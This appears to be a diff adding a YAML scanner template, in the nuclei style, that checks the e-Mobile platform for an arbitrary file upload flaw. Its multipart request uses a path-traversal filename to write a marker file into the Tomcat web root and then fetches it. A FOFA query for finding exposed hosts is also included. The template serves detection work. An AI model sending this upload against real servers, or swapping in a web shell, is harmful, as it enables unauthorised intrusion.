@@ -1,0 +1,47 @@
+id:  e-Mobile_Upload
+time: '2023-10-25'
+
+
+info:
+  name:  e-Mobile 任意文件上传漏洞
+  severity: high
+  description:  用e-Mobile 平台存在一个任意文件上传漏洞，攻击者可利用此漏洞在服务器上上传恶意文件。
+  reference: https://mp.weixin.qq.com/s/fdt-yk_EFJdbUEo7GT3Zrg
+  metadata:
+    max-request: 2
+    verified: true
+    fofa-query: app="e-Mobile"
+  
+http:
+  - method: 
+      - POST
+      - GET
+    path:
+      - "{{BaseURL}}/emp/lang2sql?client_type=1&lang_tag=1"
+      - "{{BaseURL}}/tmslpwlw.txt"
+    
+    Rheader:
+      - Content-Type:multipart/form-data;boundary=----WebKitFormBoundarymVk33liI64J7GQaK & Accept-Encoding:gzip, deflate, br  &  Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        
+    body: 
+      - |
+        ------WebKitFormBoundarymVk33liI64J7GQaK
+        Content-Disposition: form-data; name="file";filename="../../../../appsvr/tomcat/webapps/ROOT/tmslpwlw.txt"
+
+        uweesjfp
+        ------WebKitFormBoundarymVk33liI64J7GQaK--
+        
+
+      
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "uweesjfp"
+
+      - type: status
+        status:
+          - 200
+    
